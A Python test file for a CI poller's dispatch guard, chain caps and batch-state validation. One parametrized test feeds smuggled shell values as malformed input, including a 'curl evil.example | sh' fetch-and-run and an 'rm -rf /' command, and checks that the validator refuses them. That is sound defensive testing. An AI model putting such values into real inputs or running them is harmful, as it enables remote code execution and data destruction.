# Pythia
# Copyright (c) 2025 Kevin Wyjad
# Licensed under the Pythia Non-Commercial Public License v1.0.
# See the LICENSE file in the project root for details.

"""Tests for the poller's dispatch-once guard (scripts/ci/poll_llm_batches.py).

Pure-function tests over _dispatch_decision — no gh CLI, no network. The
regression pinned here: before the attempt cap existed, a failed stage was
re-dispatched every 15 minutes forever (the guard only recognized
queued/in_progress/success), and the churn eventually pushed the submit run
carrying the batch-state artifact out of the discovery window.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from scripts.ci import poll_llm_batches
from scripts.ci.emit_batch_state import dispatch_inputs_from_env
from scripts.ci.poll_llm_batches import _dispatch_decision, _dispatch_input_args

NOW = datetime(2026, 8, 1, 12, 0, tzinfo=timezone.utc)
PID = "pl_123"
STAGE = "fc_collect_finalize"
MARKER_TITLE = f"Pythia Pipeline Stage: {PID} — {STAGE}"


def _run(status="completed", conclusion="success", created_min_ago=30, title=MARKER_TITLE):
    return {
        "displayTitle": title,
        "status": status,
        "conclusion": conclusion,
        "createdAt": (NOW - timedelta(minutes=created_min_ago)).isoformat(),
    }


def _decide(runs, max_attempts=3, min_retry_minutes=60):
    return _dispatch_decision(
        PID, STAGE, runs, NOW,
        max_attempts=max_attempts, min_retry_minutes=min_retry_minutes,
    )


def test_success_run_skips_dispatch():
    dispatch, reason = _decide([_run(conclusion="success")])
    assert not dispatch
    assert "already" in reason


def test_in_progress_run_skips_dispatch():
    dispatch, _ = _decide([_run(status="in_progress", conclusion=None)])
    assert not dispatch


def test_no_prior_runs_dispatches():
    dispatch, _ = _decide([])
    assert dispatch


def test_three_failures_stall_permanently():
    runs = [
        _run(conclusion="failure", created_min_ago=300),
        _run(conclusion="cancelled", created_min_ago=200),
        _run(conclusion="timed_out", created_min_ago=100),
    ]
    dispatch, reason = _decide(runs)
    assert not dispatch
    assert reason == "STALLED"


def test_recent_failure_cools_down_then_retries():
    fresh_fail = [_run(conclusion="failure", created_min_ago=10)]
    dispatch, reason = _decide(fresh_fail)
    assert not dispatch
    assert "cooling down" in reason

    old_fail = [_run(conclusion="failure", created_min_ago=90)]
    dispatch, reason = _decide(old_fail)
    assert dispatch
    assert "attempt 2/3" in reason


def test_other_stage_failures_do_not_count():
    other = f"Pythia Pipeline Stage: {PID} — hs_rc_collect"
    runs = [
        _run(conclusion="failure", title=other),
        _run(conclusion="failure", title=other),
        _run(conclusion="failure", title=other),
    ]
    dispatch, _ = _decide(runs)
    assert dispatch


def test_other_pipeline_failures_do_not_count():
    other = f"Pythia Pipeline Stage: pl_other — {STAGE}"
    runs = [_run(conclusion="failure", title=other)] * 3
    dispatch, _ = _decide(runs)
    assert dispatch


# ---------------------------------------------------------------------------
# Run-shaping input carry-forward (smoke runs must survive a stage hand-off)
# ---------------------------------------------------------------------------


def test_dispatch_inputs_are_forwarded_verbatim():
    state = {
        "dispatch_inputs": {
            "batch_providers": "google",
            "only_countries": "IRN,SOM",
            "grounding_primary": "openai",
            "disable_brave": "true",
        }
    }
    args = _dispatch_input_args(state)
    assert args == [
        "-f", "batch_providers=google",
        "-f", "only_countries=IRN,SOM",
        "-f", "grounding_primary=openai",
        "-f", "disable_brave=true",
    ]


def test_empty_input_values_still_forward_as_empty_strings():
    # An empty only_countries is meaningful: it says "full country list",
    # which is what the workflow default resolves to anyway.
    args = _dispatch_input_args({"dispatch_inputs": {"only_countries": ""}})
    assert args == ["-f", "only_countries="]


def test_state_without_dispatch_inputs_forwards_nothing():
    # Back-compat: a batch-state artifact written before this field existed
    # must dispatch exactly as it did before.
    assert _dispatch_input_args({}) == []
    assert _dispatch_input_args({"dispatch_inputs": None}) == []
    assert _dispatch_input_args({"dispatch_inputs": "nonsense"}) == []


def test_dispatch_inputs_from_env_reflects_effective_settings():
    inputs = dispatch_inputs_from_env(
        {
            "PYTHIA_BATCH_PROVIDERS": "google",
            "PYTHIA_HS_ONLY_COUNTRIES": "IRN,SOM",
            "PYTHIA_GROUNDING_PRIMARY_BACKEND": "openai",
            "BRAVE_SEARCH_API_KEY": "",
        }
    )
    assert inputs == {
        "batch_providers": "google",
        "only_countries": "IRN,SOM",
        "grounding_primary": "openai",
        # An empty Brave key IS the disable_brave input — re-supplying the
        # secret on the next stage would let a 402ing key trip the breaker.
        "disable_brave": "true",
    }


def test_dispatch_inputs_from_env_production_defaults():
    inputs = dispatch_inputs_from_env(
        {
            "PYTHIA_BATCH_PROVIDERS": "openai,anthropic,google",
            "PYTHIA_HS_ONLY_COUNTRIES": "",
            "PYTHIA_GROUNDING_PRIMARY_BACKEND": "brave",
            "BRAVE_SEARCH_API_KEY": "sk-live",
        }
    )
    assert inputs["only_countries"] == ""
    assert inputs["disable_brave"] == "false"


# ---------------------------------------------------------------------------
# Self-rescheduling chain.
#
# The regression pinned here: the */15 cron is not honoured by GitHub (observed
# firing roughly hourly), so staged pipelines sat parked between stages for
# hours. Progress now comes from the poller chaining itself. The danger of a
# chain is that it never stops, so most of these tests are about NOT re-arming.
# ---------------------------------------------------------------------------

import pytest

from scripts.ci.poll_llm_batches import _should_rearm


def _d(action, pid="pl_1"):
    return {"pipeline_id": pid, "action": action}


@pytest.mark.parametrize("action", ["waiting", "dispatched", "already running", "cooling down"])
def test_rearms_while_a_pipeline_is_in_flight(action, monkeypatch):
    monkeypatch.delenv("POLLER_CHAIN_DEPTH", raising=False)
    rearm, why = _should_rearm([_d(action)])
    assert rearm is True
    assert action in why


def test_does_not_rearm_when_stalled(monkeypatch):
    """A STALLED pipeline is terminal — chaining would retry it forever."""
    monkeypatch.delenv("POLLER_CHAIN_DEPTH", raising=False)
    rearm, why = _should_rearm([_d("STALLED")])
    assert rearm is False
    assert "no pipeline" in why


def test_does_not_rearm_when_pipeline_completed(monkeypatch):
    """The final stage emits no batch state, so its last state lingers for the
    artifact's 14-day retention. Re-arming on it would spin forever."""
    monkeypatch.delenv("POLLER_CHAIN_DEPTH", raising=False)
    assert _should_rearm([_d("already completed")])[0] is False


def test_does_not_rearm_on_empty_decisions(monkeypatch):
    monkeypatch.delenv("POLLER_CHAIN_DEPTH", raising=False)
    assert _should_rearm([])[0] is False


def test_does_not_rearm_on_failed_dispatch(monkeypatch):
    monkeypatch.delenv("POLLER_CHAIN_DEPTH", raising=False)
    assert _should_rearm([_d("dispatch failed")])[0] is False


def test_chain_cap_stops_a_runaway_chain(monkeypatch):
    monkeypatch.setenv("POLLER_CHAIN_DEPTH", "200")
    monkeypatch.setenv("POLLER_MAX_CHAIN", "200")
    rearm, why = _should_rearm([_d("waiting")])
    assert rearm is False
    assert "chain cap" in why


def test_under_the_cap_still_rearms(monkeypatch):
    monkeypatch.setenv("POLLER_CHAIN_DEPTH", "199")
    monkeypatch.setenv("POLLER_MAX_CHAIN", "200")
    assert _should_rearm([_d("waiting")])[0] is True


def test_mixed_pipelines_rearm_if_any_is_live(monkeypatch):
    monkeypatch.delenv("POLLER_CHAIN_DEPTH", raising=False)
    assert _should_rearm([_d("STALLED", "pl_a"), _d("waiting", "pl_b")])[0] is True


def test_malformed_chain_depth_does_not_crash(monkeypatch):
    monkeypatch.setenv("POLLER_CHAIN_DEPTH", "not-a-number")
    assert _should_rearm([_d("waiting")])[0] is True


def test_completed_and_running_are_distinguishable():
    """The chain keys off this split, so collapsing them would break it."""
    assert _decide([_run(conclusion="success")])[1] == "already completed"
    assert _decide([_run(status="in_progress", conclusion=None)])[1] == "already running"


# --------------------------------------------------------------------------
# Chain cap vs wait ceiling
#
# The self-dispatch chain exists to keep polling until PYTHIA_BATCH_MAX_WAIT_H
# resolves a pipeline whose batches never finish. If the cap is reached first,
# the chain dies while the batches are still legitimately in flight and the
# pipeline parks until an hourly cron tick re-ignites it.
#
# That is not hypothetical: POLLER_MAX_CHAIN was hardcoded to 200 under a
# comment claiming "~7-minute cadence, a little over 24h". 200 x 7min is 23.3h
# — already under the 24h ceiling — and the measured cadence is ~5.4 min, giving
# 18.0h. On 2026-07-30 a run with slow gpt-5.6-sol batches hit the cap at
# exactly 18.16h with rearm=false while both batches were still in_progress.
# --------------------------------------------------------------------------


def _cap_hours(monkeypatch, wait_h: str) -> float:
    monkeypatch.delenv("POLLER_MAX_CHAIN", raising=False)
    monkeypatch.setenv("PYTHIA_BATCH_MAX_WAIT_H", wait_h)
    return poll_llm_batches._max_chain() * poll_llm_batches.POLLER_TICK_MINUTES / 60.0


@pytest.mark.parametrize("wait_h", ["12", "24", "36", "48"])
def test_chain_cap_always_outlives_the_batch_wait_ceiling(monkeypatch, wait_h):
    """The invariant: cap x tick interval MUST exceed the wait ceiling."""
    covered = _cap_hours(monkeypatch, wait_h)
    assert covered > float(wait_h), (
        f"chain covers only {covered:.1f}h but PYTHIA_BATCH_MAX_WAIT_H={wait_h}h — "
        "the chain would die while batches are still in flight"
    )


def test_chain_cap_never_shorter_than_the_historical_floor(monkeypatch):
    """Deriving the cap must not shorten it for small wait ceilings."""
    monkeypatch.delenv("POLLER_MAX_CHAIN", raising=False)
    monkeypatch.setenv("PYTHIA_BATCH_MAX_WAIT_H", "1")
    assert poll_llm_batches._max_chain() >= 200


def test_explicit_poller_max_chain_still_wins(monkeypatch):
    """Operators keep a hard stop for a runaway loop."""
    monkeypatch.setenv("PYTHIA_BATCH_MAX_WAIT_H", "48")
    monkeypatch.setenv("POLLER_MAX_CHAIN", "42")
    assert poll_llm_batches._max_chain() == 42


def test_malformed_wait_ceiling_falls_back_to_24h_basis(monkeypatch):
    monkeypatch.delenv("POLLER_MAX_CHAIN", raising=False)
    monkeypatch.setenv("PYTHIA_BATCH_MAX_WAIT_H", "not-a-number")
    covered = poll_llm_batches._max_chain() * poll_llm_batches.POLLER_TICK_MINUTES / 60.0
    assert covered > 24.0


# ---------------------------------------------------------------------------
# Public-repo hardening (security PR 4). A fork can open a pull request from a
# branch it named `main` and upload a pythia-batch-state artifact; without a
# check the poller would dispatch whatever that artifact said.
# ---------------------------------------------------------------------------


def _good_state(**overrides):
    state = {
        "pipeline_id": "hs_20261001T000000",
        "next_stage": "hs_rc_collect",
        "db_run_id": "123456789",
        "dispatch_inputs": {
            "batch_providers": "openai,anthropic,google",
            "only_countries": "IRN,SOM",
            "grounding_primary": "brave",
            "disable_brave": "false",
        },
    }
    state.update(overrides)
    return state


def test_a_well_formed_state_passes():
    assert poll_llm_batches.state_problem(_good_state()) is None
    assert poll_llm_batches.state_problem(_good_state(pipeline_id="pl_1790000000")) is None
    # A state written before dispatch_inputs existed is still well formed.
    assert poll_llm_batches.state_problem(_good_state(dispatch_inputs=None)) is None


@pytest.mark.parametrize(
    "overrides",
    [
        {"pipeline_id": 'hs_1"; curl evil.example | sh; echo "'},
        {"pipeline_id": "$(id)"},
        {"pipeline_id": ""},
        {"db_run_id": "123; rm -rf /"},
        {"next_stage": "deploy_everything"},
        {"dispatch_inputs": {"only_countries": "IRN$(id)"}},
        {"dispatch_inputs": {"grounding_primary": "evil"}},
        {"dispatch_inputs": "not a mapping"},
    ],
)
def test_a_malformed_state_is_refused(overrides):
    assert poll_llm_batches.state_problem(_good_state(**overrides)) is not None


def test_runs_a_pull_request_started_are_never_listed(monkeypatch):
    runs = [
        {"databaseId": 1, "event": "pull_request", "conclusion": "success"},
        {"databaseId": 2, "event": "pull_request_target", "conclusion": "success"},
        {"databaseId": 3, "event": "workflow_dispatch", "conclusion": "success"},
        {"databaseId": 4, "event": "schedule", "conclusion": "success"},
    ]
    seen = {}

    def fake_gh(*args):
        seen["args"] = args
        import json as _json
        return _json.dumps(runs)

    monkeypatch.setattr(poll_llm_batches, "_gh", fake_gh)
    listed = poll_llm_batches._list_runs("Pythia Pipeline Stage")
    assert [r["databaseId"] for r in listed] == [3, 4]
    assert "event" in seen["args"][seen["args"].index("--json") + 1]


# --- The listing must reach back to the pipeline (7 Oct 2026) --------------
#
# The guard looked for a pipeline's final stage among the newest 30 stage
# runs. Pipelines from 1, 2 and 6 Oct had fallen out of that window, a
# rehearsal's fresh batch state reopened the activity gate, and the poller
# re-dispatched fc_collect_finalize for all three.


def _filler(n, oldest_min_ago):
    return [
        _run(title="Pythia Pipeline Stage: hs_other — hs_submit", created_min_ago=oldest_min_ago - i)
        for i in range(n)
    ]


def test_a_pipeline_older_than_the_listing_is_not_dispatched():
    old_state = (NOW - timedelta(days=6)).isoformat()
    runs = _filler(100, oldest_min_ago=120)
    oldest, complete = poll_llm_batches._listing_bounds(runs, 100)
    assert complete is False
    dispatch, reason = _dispatch_decision(
        PID, STAGE, runs, NOW, max_attempts=3, min_retry_minutes=60,
        state_created_at=old_state, listing_reaches_back_to=oldest,
        listing_complete=complete,
    )
    assert not dispatch
    assert reason == poll_llm_batches.UNKNOWN_OUT_OF_WINDOW


def test_a_recent_cancelled_run_does_not_make_an_old_pipeline_due():
    # The cancelled re-dispatches are new and visible; the success is not.
    old_state = (NOW - timedelta(days=6)).isoformat()
    runs = _filler(99, oldest_min_ago=120) + [
        _run(conclusion="cancelled", created_min_ago=90)
    ]
    oldest, complete = poll_llm_batches._listing_bounds(runs, 100)
    dispatch, reason = _dispatch_decision(
        PID, STAGE, runs, NOW, max_attempts=3, min_retry_minutes=0,
        state_created_at=old_state, listing_reaches_back_to=oldest,
        listing_complete=complete,
    )
    assert not dispatch
    assert reason == poll_llm_batches.UNKNOWN_OUT_OF_WINDOW


def test_a_fresh_pipeline_inside_the_listing_is_still_dispatched():
    fresh_state = (NOW - timedelta(minutes=30)).isoformat()
    runs = _filler(100, oldest_min_ago=120)
    oldest, complete = poll_llm_batches._listing_bounds(runs, 100)
    dispatch, _ = _dispatch_decision(
        PID, STAGE, runs, NOW, max_attempts=3, min_retry_minutes=60,
        state_created_at=fresh_state, listing_reaches_back_to=oldest,
        listing_complete=complete,
    )
    assert dispatch


def test_a_complete_listing_answers_for_any_age():
    old_state = (NOW - timedelta(days=6)).isoformat()
    runs = _filler(5, oldest_min_ago=120)
    oldest, complete = poll_llm_batches._listing_bounds(runs, 100)
    assert complete is True
    dispatch, _ = _dispatch_decision(
        PID, STAGE, runs, NOW, max_attempts=3, min_retry_minutes=60,
        state_created_at=old_state, listing_reaches_back_to=oldest,
        listing_complete=complete,
    )
    assert dispatch


def test_an_out_of_window_pipeline_does_not_rearm_the_poller():
    rearm, _ = _should_rearm([
        {"pipeline_id": "old", "action": poll_llm_batches.UNKNOWN_OUT_OF_WINDOW},
    ])
    assert rearm is False


def test_a_failed_listing_is_unknown_not_empty(monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("gh exploded")

    monkeypatch.setattr(poll_llm_batches, "_gh", boom)
    assert poll_llm_batches._list_runs(poll_llm_batches.STAGE_WORKFLOW_NAME) is None
